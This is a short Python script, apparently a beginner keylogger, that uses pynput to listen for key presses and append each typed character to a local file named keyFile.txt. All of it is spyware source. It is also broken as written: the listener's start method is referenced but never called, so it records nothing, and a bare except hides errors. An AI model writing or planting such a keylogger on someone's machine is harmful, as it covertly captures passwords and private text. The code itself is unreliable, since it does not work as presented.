from pynput import  keyboard

def keyPressed(key):
    print(str(key))
    with open("keyFile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("ERROR getting char from key")


if __name__ == '__main__':
    listner = keyboard.Listener(on_press=keyPressed)
    listner.start
    input()